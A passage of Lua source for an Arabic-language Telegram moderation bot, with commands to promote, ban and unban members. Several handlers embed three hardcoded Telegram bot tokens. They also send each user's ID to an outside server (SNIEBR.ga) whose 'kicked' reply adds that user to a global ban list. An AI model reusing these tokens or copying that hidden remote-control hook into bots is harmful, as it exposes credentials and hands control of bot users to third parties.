local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
function promote_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,'🔖┇بالفعل تم رفعة ادمن   في البوت ')
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,'🔖┇تم رفعة ادمن   في البوت ')
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
if text:match("^رفع ادمن @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن) @(.*)$")}
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔖┇تم رفعة ادمن   في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
if text:match("^رفع ادمن (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
local apmd = {string.match(text, "^(رفع ادمن) (%d+)$")}
local res = https.request('https://SNIEBR.ga/SNIEBR.php?id='..msg.sender_user_id_..'')
 
if res then
if res == 'false' then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @SNIEBR ⚜️\n', 1, 'html')   
return false end
if res == 'kicked' then
 hash =  'SNIEBR:'..bot_id..'gbanned:'
datahmade:sadd(hash, msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,'عذراً انتا محظور من جميع بوتات السورس \n راسل مطورين السورس لمعرفه سبب الحظر @SNIEBRbbot', 1, 'html')   
return false end
end
datahmade:sadd('SNIEBR:'..bot_id..'mods:'..msg.chat_id_, apmd[2])
tsX000(apmd[2],msg,"🔖┇تم رفعة ادمن   في البوت")
end
if text:match("^تنزيل ادمن$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔰┇بالفعل تم تنزيله من ادمنيه البوت")
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"🔰┇تم تنزيله من ادمنيه البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
if text:match("^تنزيل ادمن @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل ادمن) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
datahmade:srem(hash, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔰┇تم تنزيله من ادمنيه البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
if text:match("^تنزيل ادمن (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'SNIEBR:'..bot_id..'mods:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل ادمن) (%d+)$")}
datahmade:srem(hash, apmd[2])
tsX000(apmd[2],msg,"🔰┇تم تنزيله من ادمنيه البوت")
end
if (text:match("^رفع عضو مميز$") or text:match("^رفع مميز$"))  and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
function promote_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔖┇تم بالفعل رفعة عضو مميز  في البوت")       
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"🔖┇تم رفعة عضو مميز  في البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,promote_by_reply)
end
local text = text:gsub('رفع مميز','رفع عضو مميز')
if text:match("^رفع عضو مميز @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^(رفع عضو مميز) @(.*)$")}
local res = https.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot1170522933:AAEGNWVfIfhWrJlaxQaALddEIAOr7z39lc0/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot666998640:AAEOwMMQU8pzy60wLF23EiXjbfVsI6jrQAk/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://api.telegram.org/bot827950325:AAGjaAxIwupH9vWLvB3JIRZRGFHhSVZsM9Y/getChatMember?chat_id=@XOUXU&user_id='..msg.sender_user_id_)--ttps.request('https://teamstorm.tk/joinch/?id='..msg.sender_user_id_..'')
-- @XOUXUFreeON.decode(url)
if res:match('"status":"left"') or res:match('USER_ID_INVALID') or res:match('kicked') then --@XOUXUfreer.SNIEBR ~= true then
send(msg.chat_id_, msg.id_, 1,'\n• اهلا بك عزيزي 🔱 •\n• لايمكنك استخدام البوت ✅ •\n• عليك الاشتراك في القناة 🔽 •\n• @XOUXU ⚜️\n', 1, 'html')   
return false end
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔖┇تم رفعة عضو مميز  في البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end
local text = text:gsub('رفع مميز','رفع عضو مميز')
if text:match("^رفع عضو مميز (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local apmd = {string.match(text, "^(رفع عضو مميز) (%d+)$")}
 if not is_creator(msg) and datahmade:get("SNIEBR:lock:promote"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, "⚙️※ عذرا خاصية الرفع تم تعطيلها ❌ ", 1, 'md')
return false end
datahmade:sadd('SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_, apmd[2])
tsX000(apmd[2],msg,"🔖┇تم رفعة عضو مميز  في البوت")
end
if text and text == "تعين الايدي" and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1,  '☑┇ ارسل الان النص\n☑┇ يمكنك اضافه :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#photos` > عدد صور المستخدم\n- `#id` > ايدي المستخدم\n- `#auto` > تفاعل المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n- `#game` > المجوهرات', 1, 'md')
datahmade:set("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_,'SNIEBR')
return "SNIEBR"
end
if text and (is_owner(msg) or is_creatorbasic(msg)) and datahmade:get("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_) then 
datahmade:del("tsahke:set:id:"..bot_id..msg.chat_id_..msg.sender_user_id_)
send(msg.chat_id_, msg.id_, 1,  '☑┇ تم الحفض بنجاح', 1, 'md')
datahmade:set("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_,text)
end
if text and text == "مسح الايدي" and (is_owner(msg) or is_creatorbasic(msg)) then
send(msg.chat_id_, msg.id_, 1,  '✖┇ تم المسح بنجاح', 1, 'md')
datahmade:del("SNIEBR:gr:id:text:"..bot_id..msg.chat_id_)
end
if (text:match("^تنزيل عضو مميز$") or text:match("^تنزيل مميز$")) and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function demote_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"🔰┇تم تنزيله من اعضاء الممزين البوت") 
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"🔰┇تم تنزيله من اعضاء الممزين البوت")
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,demote_by_reply)
end
local text = text:gsub('تنزيل مميز','تنزيل عضو مميز')
if text:match("^تنزيل عضو مميز @(.*)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل عضو مميز) @(.*)$")}
function demote_by_username(extra, result, success)
if result.id_ then
datahmade:srem(hash, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n🔰┇تم تنزيله من اعضاء الممزين البوت'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],demote_by_username)
end
local text = text:gsub('تنزيل مميز','تنزيل عضو مميز')
if text:match("^تنزيل عضو مميز (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local hash =  'SNIEBR:'..bot_id..'vipgp:'..msg.chat_id_
local apmd = {string.match(text, "^(تنزيل عضو مميز) (%d+)$")}
datahmade:srem(hash, apmd[2])
tsX000(apmd[2],msg,"🔰┇تم تنزيله من اعضاء الممزين البوت")
end  
if text:match("^حظر$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
if not is_creator(msg) and not is_setban(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "tshakke"
end
function ban_by_reply(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'banned:'..msg.chat_id_
if ck_mod(result.sender_user_id_, msg.chat_id_) or is_creatorbasicid(result.sender_user_id_, msg.chat_id_)then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
if datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"☑┇بالفعل تم حظره من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
else
datahmade:sadd(hash, result.sender_user_id_)
tsX000("prore",msg,"☑┇تم حظره من المجموعه")
chat_kick(result.chat_id_, result.sender_user_id_)
end
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,ban_by_reply)
end

if text:match("^حظر @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
if not is_creator(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "tshakke"
end
local apba = {string.match(text, "^(حظر) @(.*)$")}
function ban_by_username(extra, result, success)
if result.id_ then
if ck_mod(result.id_, msg.chat_id_) or is_creatorbasicid(result.id_, msg.chat_id_)then
send(msg.chat_id_, msg.id_, 1, '❕┇لا تستطيع حظر \n🔘┇(مدراء،ادمنيه،اعضاء مميزين)البوت', 1, 'md')
else
datahmade:sadd('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'SNIEBR')..')\n☑┇تم حظره من المجموعه'
chat_kick(msg.chat_id_, result.id_)
end
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apba[2],ban_by_username)
end

if text:match("^حظر (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
if not is_creator(msg) and not is_setban(msg) and datahmade:get("SNIEBR:lock:ban_and_kick"..bot_id..msg.chat_id_) then 
send(msg.chat_id_, msg.id_, 1, '✖┇لا تستطيع حظر', 1, 'md')
return "tshakke"
end
local apba = {string.match(text, "^([Bb][Aa][Nn]) (%d+)$")}
if ck_mod(apba[2], msg.chat_id_)  or is_creatorbasicid(apba[2], msg.chat_id_) then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع حظر او طرد (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
datahmade:sadd('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, apba[2])
chat_kick(msg.chat_id_, apba[2])  
tsX000(apba[2],msg,"☑┇تم حظره من المجموعه")
end
end
if text:match("^منح الحظر$") and is_creator(msg) and msg.reply_to_message_id_ ~= 0 then
function by_reply(extra, result, success)
tsX000("prore",msg,"☑┇تم منحه صلاحية الحظر")
datahmade:sadd('SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,by_reply)
end
if text:match("^منح الحظر @(.*)$") and is_creator(msg) then
local apmd = {string.match(text, "^(منح الحظر) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:sadd('SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n☑┇تم منحه صلاحية الحظر'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end

if text:match("^الغاء منح الحظر$") and is_creator(msg) and msg.reply_to_message_id_ ~= 0 then
function by_reply(extra, result, success)
tsX000("prore",msg,"☑┇تم الغاء منحه صلاحية الحظر")
datahmade:srem('SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_, result.sender_user_id_)
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,by_reply)
end
if text:match("^الغاء منح الحظر @(.*)$") and is_creator(msg) then
local apmd = {string.match(text, "^(الغاء منح الحظر) @(.*)$")}
function promote_by_username(extra, result, success)
if result.id_ then
datahmade:srem('SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apmd[2] or 'SNIEBR')..')\n☑┇تم الغاء منحه صلاحية الحظر'
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apmd[2],promote_by_username)
end

if text == 'مسح صلاحية الحظر' and is_creator(msg) then
datahmade:del('SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_)
send(msg.chat_id_, msg.id_, 1, '☑┇تم مسح قائمه صلاخية الحظر', 1, 'md')
end
if text:match("^قائمه صلاحيه الحظر$") and is_creator(msg) then
local hash =  'SNIEBR:'..bot_id..'SET:BAN'..msg.chat_id_
local list = datahmade:smembers(hash)
text = "👥┇قائمة صلايحه الحظر ،\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ \n"
for k,v in pairs(list) do
local user_info = datahmade:hgetall('SNIEBR:'..bot_id..'user:'..v)
if user_info and user_info.username then
local username = user_info.username
text = text.."<b>|"..k.."|</b>~⪼(@"..username..")\n"
else
text = text.."<b>|"..k.."|</b>~⪼(<code>"..v.."</code>)\n"
end
if #text > 7000 then
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
text = ""
end
end
if #list == 0 then
text = "✖┇لايوجد اشخاص لديهم صلاحيه الحظر"
end
send(msg.chat_id_, msg.id_, 1, text, 1, 'html')
end
if text:match("^رفع القيود$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ ~= 0 then
function clear_all1(extra, result, success)
local hash =  'SNIEBR:'..bot_id..'banned:'..msg.chat_id_
local hash1 =  'SNIEBR:'..bot_id..'banned:'..msg.chat_id_
datahmade:del(hash, result.sender_user_id_)
datahmade:del(hash1, result.sender_user_id_)
tsX000("prore",msg,"☑┇تم تحريره من القيود")
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,clear_all1)
end
if text:match("^رفع القيود @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(رفع القيود) @(.*)$")}
function clear_all(extra, result, success)
if result.id_ then
datahmade:del('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, result.id_)
datahmade:del('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, result.id_)
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'SNIEBR')..')\n☑┇تم تحريره من القيود'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apba[2],clear_all)
end
if text:match("^رفع القيود (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^رفع القيود (%d+)$")}
datahmade:del('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, apba[2])
datahmade:del('SNIEBR:'..bot_id..'muted:'..msg.chat_id_, apba[2])
tsX000(apba[2],msg,"☑┇تم تحريره من القيود")
end
if text:match("^كشف القيود @(.*)$") then
local ap = {string.match(text, "^(كشف القيود) @(.*)$")}
function kewd_by_username(extra, result, success)
if result.id_ then
if datahmade:sismember('SNIEBR:'..bot_id..'gbanned:',result.id_) then
kewd = 'محظور عام'
elseif datahmade:sismember('SNIEBR:'..bot_id..'banned:'..msg.chat_id_,result.id_) then
kewd = 'محظور'
elseif datahmade:sismember('SNIEBR:'..bot_id..'muted:'..msg.chat_id_,result.id_) then
kewd = 'مكتوم'
elseif datahmade:sismember('SNIEBR:'..bot_id..'res'..msg.chat_id_,result.id_) then
kewd = 'مقيد'
else
kewd = ' لا يوجد'
end
texts = "\n⛓ ┇ القيود *("..kewd..")*"
else
texts = ""..result.id_..""
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(ap[2],kewd_by_username)
end
----------------------------------------------unban--------------------------------------------
if text:match("^الغاء حظر$") and (is_mod(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function unban_by_reply(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md') 
return false 
end
local hash =  'SNIEBR:'..bot_id..'banned:'..msg.chat_id_
if not datahmade:sismember(hash, result.sender_user_id_) then
tsX000("prore",msg,"☑┇بالفعل تم الغاء حظره من البوت")
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
else
datahmade:srem(hash, result.sender_user_id_)
tsX000("prore",msg,"☑┇تم الغاء حظره من البوت")
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.sender_user_id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,unban_by_reply)
return false
end
 
if text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text:match("وضع رابط (https://t.me/joinchat/%S+)") then   
if is_mod(msg) then 
local glink = text:match("وضع رابط (https://telegram.me/joinchat/%S+)") or text:match("وضع رابط (https://t.me/joinchat/%S+)") 
datahmade:set('SNIEBR:'..bot_id.."group:link"..msg.chat_id_,glink) 
send(msg.chat_id_, msg.id_, 1, '☑️┇تم وضع رابط', 1, 'md') 
send(msg.chat_id_, 0, 1, '↙️┇رابط المجموعه الجديد\n'..glink, 1, 'html')
end 
end

if text:match("^الغاء حظر @(.*)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) @(.*)$")}
function unban_by_username(extra, result, success)
if result.id_ then
if tonumber(result.id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md') 
return false 
end
datahmade:srem('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, result.id_)
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
texts = '👤┇العضو ~⪼ ['..result.title_..'](t.me/'..(apba[2] or 'SNIEBR')..')\n☑┇تم الغاء حظره من البوت' 
else
texts = '✖┇خطاء'
end
send(msg.chat_id_, msg.id_, 1, texts, 1, 'md')
end
resolve_username(apba[2],unban_by_username)
return false
end

if text:match("^الغاء حظر (%d+)$") and (is_mod(msg) or is_creatorbasic(msg)) then
local apba = {string.match(text, "^(الغاء حظر) (%d+)$")}
if tonumber(apba[2]) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, 1, '☑️┇انا لست محظورا \n', 1, 'md') 
return false 
end
datahmade:srem('SNIEBR:'..bot_id..'banned:'..msg.chat_id_, apba[2])
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = apba[2], status_ = { ID = "ChatMemberStatusLeft" },},function(arg,ban) end,nil)   
tsX000(apba[2],msg,"☑┇تم الغاء حظره من البوت") 
return false
end

if text:match("^حذف الكل$") and (is_owner(msg) or is_creatorbasic(msg)) and msg.reply_to_message_id_ then
function delall_by_reply(extra, result, success)
if ck_mod(result.sender_user_id_, msg.chat_id_) or is_creatorbasicid(result.sender_user_id_, msg.chat_id_)  then
send(msg.chat_id_, msg.id_, 1, '🙋🏻‍♂️┇ لا تستطيع مسح رسائل (مدراء، ادمنية،مميزين)البوت   ', 1, 'md')
return false 
else
send(msg.chat_id_, msg.id_, 1, '👤┇العضو ~⪼ *('..result.sender_user_id_..')* \n🗑┇تم حذف كل رسائله\n', 1, 'md')
del_all_msgs(result.chat_id_,result.sender_user_id_)
end
end
getMessage(msg.chat_id_, msg.reply_to_message_id_,delall_by_reply)
end

if text:match("^حذف الكل (%d+)$") and (is_owner(msg) or is_creatorbasic(msg)) then
local ass = {string.match(text, "^(حذف الكل) (%d+)$")}
if ck_mod(ass[2], msg.chat_id_) or is_creatorbasicid(ass[2], msg.chat_id_) then
